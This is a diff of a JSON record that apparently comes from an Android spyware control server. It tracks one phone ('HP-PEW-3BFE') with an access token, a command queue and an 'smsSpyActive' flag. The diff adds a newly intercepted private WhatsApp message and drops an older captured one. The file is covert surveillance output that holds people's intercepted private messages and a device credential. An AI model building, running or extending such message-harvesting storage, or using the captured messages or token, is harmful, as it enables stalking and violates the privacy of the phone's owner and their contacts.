@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776861186718,
+    "lastSeen": 1776861189679,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "prily 🤍",
+        "content": "ku suruh buang kan tadi",
+        "time": "22/04 20:33",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776861192538
+      },
       {
         "appName": "WhatsApp",
         "sender": "Menghapus pesan…",
@@ -4011,14 +4019,6 @@
         "time": "22/04 15:16",
         "pkg": "com.whatsapp",
         "receivedAt": 1776842167770
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎7Sex Message (67 pesan): ~ ᥬ--𝗛𝗔𝗠𝗭 || 𝗖𝘆𝗯𝗲𝗿​​᭄ツ",
-        "content": "Sairi bot, Aktif kak\nSilahkan ketik /menu",
-        "time": "22/04 15:16",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776842167768
       }
     ],
     "galleryPhotos": [],
